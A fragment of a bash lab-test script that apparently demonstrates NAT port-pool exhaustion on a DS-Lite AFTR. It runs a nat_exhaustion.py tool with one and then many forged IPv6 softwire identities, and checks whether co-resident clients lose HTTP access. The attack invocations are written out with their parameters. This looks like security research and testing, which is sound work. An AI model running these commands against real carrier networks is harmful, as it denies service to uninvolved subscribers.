    local v1b v2b; v1b=$(httpc client1 "http://$SRV/"); v2b=$(httpc client2 "http://$SRV/")
    info "client1=$v1b  client2=$v2b"
    nse aftr conntrack -F >/dev/null 2>&1
    # ── CONTROL: ONE identity, capped at 2000 << 64512 -> co-residents stay up (this is T1) ──
    step "Control: ONE forged identity pinned to :$dport; the per-subscriber cap (2000) cannot fill the pool."
    nse attacker sh -c "timeout 12 python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --src-ip6 ${C_PREFIX}:dead::1 --fixed-dport $dport --proto tcp --dst-ip4 $SRV --aftr-ip6 $AFTR --inner-src-prefix 10.90.0.0/16 --threads 6 --batch 256 >/dev/null 2>&1" &
    sleep 9
    local pool1 c1 c2
    pool1=$(nse aftr conntrack -L 2>/dev/null | grep -c "dst=$SRV.*dport=$dport")
    c1=$(httpc client1 "http://$SRV/"); c2=$(httpc client2 "http://$SRV/")
    info "ONE identity: pool(->:$dport)=$pool1 (capped ~2000) -> client1=$c1 client2=$c2  [co-residents UP, isolation holds]"
    nse attacker pkill -9 -f nat_exhaustion 2>/dev/null; nse aftr conntrack -F >/dev/null 2>&1; sleep 2
    # ── ATTACK: MANY forged identities -> fill the shared pool -> co-residents denied ──
    start_caps "$(spec_T12)" "$outdir" "T12"
    step "Attack: MANY forged softwire identities (prefix $pfx) pinned to :$dport drain the shared pool."
    local cmd="python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --src-ip6-prefix $pfx --fixed-dport $dport --proto tcp --dst-ip4 $SRV --aftr-ip6 $AFTR --inner-src-prefix 10.90.0.0/16 --threads 8 --batch 256"
    CMDS_RUN="attacker CONTROL: one --src-ip6 identity (capped)
attacker ATTACK: $cmd"
    nse attacker sh -c "timeout 30 $cmd >/dev/null 2>&1" &
    sleep 12
    local poolN cN1 cN2
    poolN=$(nse aftr conntrack -L 2>/dev/null | grep -c "dst=$SRV.*dport=$dport")
    cN1=$(httpc client1 "http://$SRV/"); cN2=$(httpc client2 "http://$SRV/")
    info "MANY identities: pool(->:$dport)=$poolN (near 64512) -> client1=$cN1 client2=$cN2  [co-residents DENIED, isolation broken]"
    stop_caps; cap_summary
    nse attacker pkill -9 -f nat_exhaustion 2>/dev/null; nse aftr conntrack -F >/dev/null 2>&1
    REF_LINE="one forged identity is capped and leaves co-residents reachable (200); many forged identities fill the 64512-port pool and deny both co-residents (200->000)"
    RUN_LINE="ONE: pool=$pool1 co-res=$c1/$c2; MANY: pool=$poolN co-res=$cN1/$cN2"
    if [ "${c2:-000}" = "200" ] && [ "${cN2:-200}" != "200" ] && [ "${poolN:-0}" -gt 40000 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}
